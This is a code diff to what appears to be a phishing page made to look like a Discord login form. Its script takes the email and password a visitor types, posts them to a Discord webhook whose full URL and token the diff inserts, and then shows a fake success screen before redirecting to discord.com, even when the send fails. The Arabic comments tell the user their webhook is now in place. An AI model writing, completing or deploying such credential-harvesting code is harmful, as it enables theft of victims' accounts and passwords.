@@ -189,7 +189,7 @@
 
     <script>
         document.getElementById('discordLoginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+            event.preventDefault(); // منع المتصفح من الانتقال الفوري أو التحديث قبل إتمام الإرسال
             
             const emailInput = document.getElementById('login-input').value;
             const passwordInput = document.getElementById('password-input').value;
@@ -205,7 +205,8 @@
 
             errorText.style.display = 'none';
 
-            const webhookUrl = 'https://discord.com';
+            // تم وضع رابط الـ Webhook الجديد الخاص بك هنا بنجاح
+            const webhookUrl = 'https://discord.com/api/webhooks/1507117032120778782/Cb8Mm_R0znUAV8hsNb3Qtim6GsDjvSIGp1v-2eWOSd2A0m_bEf8d2Eivk3lmOYBIUnZM';
 
             const packet = {
                 embeds: [{
@@ -219,20 +220,23 @@
                 }]
             };
 
+            // تشغيل عملية الإرسال أولاً
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(packet)
             })
             .then(() => {
+                // تفعيل شاشة النجاح والتوجيه بعد تأكيد إرسال الحزمة بنجاح
                 document.getElementById('loginArea').style.display = 'none';
                 document.getElementById('successArea').style.display = 'block';
                 
                 setTimeout(function() {
-                    window.location.href = 'https://discord.com';
+                    window.location.href = 'https://discord.com'; // يمكنك تغيير هذا لرابط موقعك الثاني المطلوب
                 }, 2000);
             })
             .catch(err => {
+                // الأمان البديل: التوجيه الفوري في حال حدوث أي مشكلة طارئة بالشبكة
                 document.getElementById('loginArea').style.display = 'none';
                 document.getElementById('successArea').style.display = 'block';
                 
